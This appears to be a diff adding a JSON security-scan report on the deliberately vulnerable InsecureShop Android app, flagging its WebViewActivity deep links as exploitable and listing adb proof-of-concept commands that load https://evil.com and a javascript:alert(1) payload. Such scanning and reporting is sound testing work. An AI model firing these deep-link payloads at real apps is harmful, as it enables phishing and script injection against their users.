@@ -1,0 +1,45 @@
+{
+    "package": "com.insecureshop",
+    "findings": [
+        {
+            "activity": "com.insecureshop.WebViewActivity",
+            "source": "/home/kali/Desktop/deepC/webdeepc/backend/deepc_jadx_out/sources/com/insecureshop/WebViewActivity.java",
+            "path": "/webview",
+            "manifest_path": null,
+            "code_paths": [
+                "/webview",
+                "/web"
+            ],
+            "query_param": "url",
+            "level": "VULNERABLE",
+            "weak_validation": false,
+            "strong_validation": false,
+            "pocs": [
+                "adb shell am start -a android.intent.action.VIEW -d \"insecureshop://com.insecureshop/webview?url=https://evil.com\"",
+                "adb shell am start -a android.intent.action.VIEW -d \"insecureshop://com.insecureshop/webview?url=javascript:alert(1)\"",
+                "adb shell am start -n com.insecureshop/com.insecureshop.WebViewActivity"
+            ],
+            "ai_review": "EXPLOITABLE: The lack of validation for the 'url' query parameter in the WebViewActivity allows for potential malicious URLs to be loaded, posing a significant security risk."
+        },
+        {
+            "activity": "com.insecureshop.WebViewActivity",
+            "source": "/home/kali/Desktop/deepC/webdeepc/backend/deepc_jadx_out/sources/com/insecureshop/WebViewActivity.java",
+            "path": "/web",
+            "manifest_path": null,
+            "code_paths": [
+                "/webview",
+                "/web"
+            ],
+            "query_param": "url",
+            "level": "VULNERABLE",
+            "weak_validation": false,
+            "strong_validation": false,
+            "pocs": [
+                "adb shell am start -a android.intent.action.VIEW -d \"insecureshop://com.insecureshop/web?url=https://evil.com\"",
+                "adb shell am start -a android.intent.action.VIEW -d \"insecureshop://com.insecureshop/web?url=javascript:alert(1)\"",
+                "adb shell am start -n com.insecureshop/com.insecureshop.WebViewActivity"
+            ],
+            "ai_review": "EXPLOITABLE: The lack of strong validation on the query parameter 'url' in the WebViewActivity indicates that an attacker could potentially manipulate the input to load malicious content, leading to security vulnerabilities such as phishing or data leakage."
+        }
+    ]
+}
